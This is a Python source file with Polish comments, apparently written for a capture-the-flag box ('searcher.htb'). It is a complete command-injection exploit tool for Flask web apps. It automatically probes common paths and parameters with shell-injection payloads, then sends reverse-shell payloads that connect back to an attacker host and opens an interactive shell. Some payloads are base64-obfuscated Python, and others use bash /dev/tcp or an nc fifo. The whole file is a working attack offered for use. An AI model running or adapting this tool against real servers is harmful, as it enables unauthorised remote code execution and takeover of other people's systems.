#!/usr/bin/env python3
"""
cwe73poc.py — uniwersalny PoC CWE-73 -> CWE-78 (command injection) dla Flask.
Jeden plik, zero zależności.

Tryby:
  --self-test        testy payloadów lokalnie
  --discover         auto-discovery (COMMON_PATHS × COMMON_PARAMS)
  --gobuster FILE    wczytaj ścieżki z outputu gobustera
  --crawl            crawlnij strony, wyciągnij formularze/linki z parametrami
  --extra k=v ...    stałe parametry doklejane do każdego requestu (np. q=test)
  --exploit          wyślij reverse shell

Przykłady:
  python3 cwe73poc.py --self-test --lhost 10.10.14.4
  python3 cwe73poc.py --target http://searcher.htb --gobuster gobuster.txt --crawl \
      --discover --lhost 10.10.14.4
  python3 cwe73poc.py --target http://searcher.htb --path / --param engine \
      --extra q=test --exploit --mode python --lhost 10.10.14.4 --lport 4444
"""
import argparse
import base64
import re
import select
import socket
import sys
import threading
import urllib.request
from urllib.error import HTTPError, URLError
from urllib.parse import quote, unquote, urlparse
from urllib.request import Request


# ==========================================================
# 0. HTTP opener — bez proxy, bez auto-redirect
# ==========================================================
class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


_OPENER = urllib.request.build_opener(
    urllib.request.ProxyHandler({}),
    _NoRedirect(),
)


# ==========================================================
# 1. DETEKCJA INJEKCJI
# ==========================================================
# Marker: PWN_$(id -u)_END
#  - jeśli injekcja działa:   body zawiera PWN_0_END / PWN_1000_END
#  - jeśli tylko odbicie:     body zawiera literalnie PWN_$(id -u)_END
# Regex \d+ odrzuca literalne $(id -u) — koniec fałszywych trafień.
MARKER_RE = re.compile(r"PWN_(\d+)_END")
MARKER_CMD = "PWN_$(id -u)_END"


def injection_variants():
    return [
        f"*; echo {MARKER_CMD}",
        f"* && echo {MARKER_CMD}",
        f"* || echo {MARKER_CMD}",
        f"* | echo {MARKER_CMD}",
        f"* `echo {MARKER_CMD}`",
        f"* $(echo {MARKER_CMD})",
        f"*\n echo {MARKER_CMD}",
        f"; echo {MARKER_CMD}",
    ]


# ==========================================================
# 2. REVERSE SHELLE
# ==========================================================
def _b64(code: str) -> str:
    return base64.b64encode(code.encode()).decode()


def reverse_shell_python(host: str, port: int) -> str:
    code = (
        "import socket,os,pty\n"
        "s=socket.socket()\n"
        f"s.connect(('{host}',{port}))\n"
        "os.dup2(s.fileno(),0)\n"
        "os.dup2(s.fileno(),1)\n"
        "os.dup2(s.fileno(),2)\n"
        "pty.spawn('/bin/sh')\n"
    )
    return f"echo {_b64(code)} | base64 -d | python3"


def reverse_shell_python_c(host: str, port: int) -> str:
    code = (
        "import socket,os,pty;s=socket.socket();"
        f"s.connect(('{host}',{port}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "pty.spawn('/bin/sh')"
    )
    b64 = base64.urlsafe_b64encode(code.encode()).decode().rstrip("=")
    return f"python3 -c \"import base64;exec(base64.urlsafe_b64decode('{b64}==='))\""


def reverse_shell_bash(host: str, port: int) -> str:
    return f"bash -c bash -i >& /dev/tcp/{host}/{port} 0>&1"


def reverse_shell_nc(host: str, port: int) -> str:
    return f"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {host} {port} > /tmp/f"


SHELL_MODES = {
    "python":   reverse_shell_python,
    "python_c": reverse_shell_python_c,
    "bash":     reverse_shell_bash,
    "nc":       reverse_shell_nc,
}


def build_full_payload(host: str, port: int, mode: str = "python") -> str:
    if mode == "echo":
        return injection_variants()[0]
    return f"*; {SHELL_MODES[mode](host, port)} &"


# ==========================================================
# 3. LISTY
# ==========================================================
COMMON_PATHS = [
    "/", "/search", "/query", "/check", "/ping", "/lookup",
    "/dns", "/whois", "/exec", "/run", "/api", "/api/search",
    "/api/query", "/api/check", "/api/ping", "/api/lookup",
    "/api/dns", "/api/whois", "/api/exec", "/api/run",
]
COMMON_PARAMS = [
    "q", "query", "search", "file", "filename", "path", "name",
    "host", "domain", "ip", "address", "url", "target",
    "cmd", "command", "exec", "input", "data", "engine",
]
SKIP_PATHS = ("/favicon.ico", "/static", "/robots.txt", "/health", "/metrics")


# ==========================================================
# 4. HTTP
# ==========================================================
def build_url(target, path, param, payload, extra=None):
    base = target.rstrip("/")
    if not path.startswith("/"):
        path = "/" + path
    parts = []
    if extra:
        for kv in extra:
            if "=" in kv:
                k, v = kv.split("=", 1)
                parts.append(f"{k}={quote(v, safe='')}")
    parts.append(f"{param}={quote(payload, safe='')}")
    return f"{base}{path}?" + "&".join(parts)


def http_get(url, timeout=5.0):
    try:
        req = Request(url, headers={"User-Agent": "cwe73poc"})
        with _OPENER.open(req, timeout=timeout) as r:
            return r.status, r.read(200_000).decode(errors="replace"), r.geturl()
    except HTTPError as e:
        body = e.read(200_000).decode(errors="replace") if e.fp else ""
        loc = e.headers.get("Location") if e.headers else None
        if loc and e.code in (301, 302, 303, 307, 308):
            print(f"\n[!] {url} -> {e.code} -> {loc}")
            print(f"[!] Jeśli vhost: dodaj do /etc/hosts: <IP> {urlparse(loc).hostname}")
        return e.code, body, getattr(e, "url", url)
    except URLError as e:
        return 0, f"URLError: {e.reason}", url
    except Exception as e:
        return 0, f"{type(e).__name__}: {e}", url


# ==========================================================
# 5. GOBUSTER + CRAWL
# ==========================================================
def parse_gobuster(filepath: str) -> list[str]:
    paths = []
    with open(filepath, "r", errors="replace") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if "(Status: 404)" in line:
                continue
            m = re.match(r"^(/[^\s]*)", line)
            if not m:
                continue
            p = m.group(1).split("?", 1)[0]
            if p and p not in paths:
                paths.append(p)
    return paths


def extract_params_from_html(html: str, base_path: str = "/"):
    results = set()
    for m in re.finditer(r"<form[^>]*>(.*?)</form>", html, re.I | re.S):
        whole = m.group(0)
        action_m = re.search(r'action=["\']([^"\']*)["\']', whole, re.I)
        action = action_m.group(1) if action_m else base_path
        action_path = action.split("?", 1)[0] or base_path
        if not action_path.startswith("/"):
            action_path = "/" + action_path
        for inp in re.finditer(
            r'<(?:input|select|textarea)[^>]*name=["\']([^"\']+)["\']', whole, re.I
        ):
            if inp.group(1):
                results.add((action_path, inp.group(1)))
    for m in re.finditer(r'href=["\']([^"\']+)["\']', html, re.I):
        url = m.group(1)
        if url.startswith(("http://", "https://")):
            parsed = urlparse(url)
            url = parsed.path + ("?" + parsed.query if parsed.query else "")
        if "?" not in url:
            continue
        path, _, query = url.partition("?")
        path = path or base_path
        if not path.startswith("/"):
            path = "/" + path
        for pair in query.split("&"):
            if "=" in pair:
                k = pair.split("=", 1)[0]
                if k and not k.startswith("#"):
                    results.add((path, k))
    return results


def crawl_for_params(target: str, paths: list[str]):
    found = set()
    for p in dict.fromkeys(["/"] + [x for x in paths if x != "/"]):
        if any(p.startswith(s) for s in SKIP_PATHS):
            continue
        status, body, _ = http_get(target.rstrip("/") + p, timeout=5.0)
        if status and body:
            params = extract_params_from_html(body, p)
            if params:
                print(f"[+] {p}: {sorted(params)}")
                found |= params
    return found


# ==========================================================
# 6. DISCOVERY
# ==========================================================
def probe_baseline(target, path, param, extra=None):
    status, _, _ = http_get(build_url(target, path, param, "test123", extra), timeout=4.0)
    return status not in (0, 404, 405, 501)


def try_injection(target, path, param, extra=None):
    for v in injection_variants():
        status, body, _ = http_get(build_url(target, path, param, v, extra), timeout=4.0)
        if status and MARKER_RE.search(body):
            return v
    return None


def discover(target, pairs, extra=None):
    status, body, final = http_get(target + "/", timeout=5.0)
    if status == 0:
        print(f"[!] Target nieosiągalny: {body}")
        return []
    print(f"[*] Target żyje: HTTP {status}, final={final}")
    hits = []
    n = len(pairs)
    for i, (path, param) in enumerate(pairs, 1):
        sys.stdout.write(f"\r[*] {i}/{n}  {path}?{param}                                    ")
        sys.stdout.flush()
        if not probe_baseline(target, path, param, extra):
            continue
        p = try_injection(target, path, param, extra)
        if p:
            print(f"\n[+] HIT {path}?{param}=  payload={p!r}")
            hits.append({"path": path, "param": param, "payload": p})
    print(f"\n[*] Sprawdzono {n}, trafień: {len(hits)}")
    return hits


# ==========================================================
# 7. LISTENER + EXPLOIT
# ==========================================================
def start_listener(bind_host, bind_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((bind_host, bind_port))
    s.listen(1)
    print(f"[*] Listener: {bind_host}:{bind_port}")
    return s


def accept_one(listener, timeout):
    listener.settimeout(timeout)
    try:
        conn, addr = listener.accept()
    except socket.timeout:
        print("[!] Timeout — brak połączenia.")
        return None
    print(f"[+] Shell from {addr[0]}:{addr[1]}")
    return conn


def interactive(conn):
    print("[*] Shell (Ctrl-C wyjście)\n")
    try:
        while True:
            r, _, _ = select.select([conn, sys.stdin], [], [])
            if conn in r:
                data = conn.recv(4096)
                if not data:
                    break
                sys.stdout.buffer.write(data)
                sys.stdout.buffer.flush()
            if sys.stdin in r:
                cmd = sys.stdin.buffer.readline()
                if not cmd:
                    break
                conn.sendall(cmd)
    except KeyboardInterrupt:
        print("\n[*] Zamykam.")
    finally:
        try:
            conn.close()
        except Exception:
            pass


def exploit(target, path, param, lhost, lport, mode, wait, extra=None):
    listener = None
    if mode != "echo":
        listener = start_listener("0.0.0.0", lport)
    payload = build_full_payload(lhost, lport, mode)
    print(f"[*] Payload: {payload[:200]}{'...' if len(payload) > 200 else ''}")
    url = build_url(target, path, param, payload, extra)
    print(f"[*] GET {url[:200]}{'...' if len(url) > 200 else ''}")

    def _send():
        s, b, _ = http_get(url, timeout=6.0)
        print(f"[*] HTTP {s} ({len(b)}B)")

    threading.Thread(target=_send, daemon=True).start()
    if listener:
        conn = accept_one(listener, wait)
        if conn:
            interactive(conn)
        listener.close()
    return 0


# ==========================================================
# 8. SELF-TEST
# ==========================================================
def self_test(lhost, lport):
    print("[*] Self-test...")
    fail = 0
    if MARKER_RE.search("x PWN_0_END y"):
        print("[ok] regex łapie PWN_0_END")
    else:
        print("[!] regex NIE łapie PWN_0_END")
        fail += 1
    if MARKER_RE.search("x PWN_$(id -u)_END y"):
        print("[!] regex fałszywie łapie literalny $(id -u)")
        fail += 1
    else:
        print("[ok] regex odrzuca literalny $(id -u)")

    for mode in list(SHELL_MODES) + ["echo"]:
        p = build_full_payload(lhost, lport, mode)
        print(f"\n[mode={mode}] {p[:160]}{'...' if len(p) > 160 else ''}")
        if unquote(quote(p, safe="")) != p:
            print("  [!] URL round-trip psuje")
            fail += 1
        else:
            print("  [ok] URL round-trip")
        if mode in ("python", "python_c"):
            if "| base64 -d" in p:
                part = p.split("echo ", 1)[1].split(" | base64 -d", 1)[0].strip()
                try:
                    decoded = base64.b64decode(part).decode()
                except Exception as e:
                    print(f"  [!] b64: {e}")
                    fail += 1
                    continue
            else:
                m = re.search(r"b64decode\('([^']+)'\)", p)
                if not m:
                    print("  [!] brak b64")
                    fail += 1
                    continue
                raw = m.group(1)
                decoded = base64.urlsafe_b64decode(raw + "=" * (-len(raw) % 4)).decode()
            try:
                compile(decoded, "<payload>", "exec")
                print("  [ok] compile")
            except SyntaxError as e:
                print(f"  [!] SyntaxError: {e}")
                fail += 1
    print()
    print("[+] Self-test: OK" if not fail else f"[!] Self-test: {fail} błędów")
    return 0 if not fail else 1


# ==========================================================
# 9. MAIN
# ==========================================================
def _ensure_scheme(t):
    return t if "://" in t else "http://" + t


def main():
    ap = argparse.ArgumentParser(description="Uniwersalny PoC CWE-73->RCE.")
    ap.add_argument("--target")
    ap.add_argument("--path")
    ap.add_argument("--param")
    ap.add_argument("--lhost", required=True)
    ap.add_argument("--lport", type=int, default=4444)
    ap.add_argument("--mode", choices=list(SHELL_MODES) + ["echo"], default="python")
    ap.add_argument("--wait", type=int, default=30)
    g = ap.add_mutually_exclusive_group()
    g.add_argument("--discover", action="store_true")
    g.add_argument("--exploit", action="store_true")
    g.add_argument("--self-test", action="store_true")
    ap.add_argument("--paths", nargs="*")
    ap.add_argument("--params", nargs="*")
    ap.add_argument("--gobuster", help="plik z outputem gobustera (dir mode)")
    ap.add_argument("--crawl", action="store_true",
                    help="crawlnij strony, wyciągnij formularze/linki z parametrami")
    ap.add_argument("--extra", nargs="*", default=None,
                    help="stałe parametry k=v doklejane do każdego requestu, np. --extra q=test")
    args = ap.parse_args()

    if args.target:
        args.target = _ensure_scheme(args.target)

    if args.self_test:
        return self_test(args.lhost, args.lport)
    if not args.target:
        print("[!] --target wymagane")
        return 2

    if args.discover:
        paths = list(args.paths or COMMON_PATHS)
        if args.gobuster:
            gb = parse_gobuster(args.gobuster)
            print(f"[*] Gobuster: {len(gb)} ścieżek")
            for p in gb:
                if p not in paths:
                    paths.append(p)

        pairs = []
        if args.crawl:
            crawled = crawl_for_params(args.target, paths)
            pairs.extend(crawled)

        # zawsze dorzuć cross z parametrami (uzupełnienie crawl)
        extra_params = args.params or COMMON_PARAMS
        seen = set(pairs)
        for p in paths:
            for q in extra_params:
                if (p, q) not in seen:
                    pairs.append((p, q))
                    seen.add((p, q))

        hits = discover(args.target, pairs, args.extra)
        if not hits:
            print("[!] Brak trafień.")
            return 1
        print("\n=== TRAFIENIA ===")
        for h in hits:
            print(f"  {h['path']}?{h['param']}=")
        print("\nExploit:")
        extra_s = " ".join(f"--extra {x}" for x in (args.extra or []))
        for h in hits:
            print(f"  python3 {sys.argv[0]} --target {args.target} "
                  f"--path {h['path']} --param {h['param']} {extra_s} "
                  f"--exploit --mode python --lhost {args.lhost} --lport {args.lport}")
        return 0

    if args.exploit:
        if not (args.path and args.param):
            print("[!] --exploit wymaga --path i --param")
            return 2
        return exploit(args.target, args.path, args.param, args.lhost,
                       args.lport, args.mode, args.wait, args.extra)

    print("[!] Wybierz --discover/--exploit/--self-test")
    return 2


if __name__ == "__main__":
    sys.exit(main())
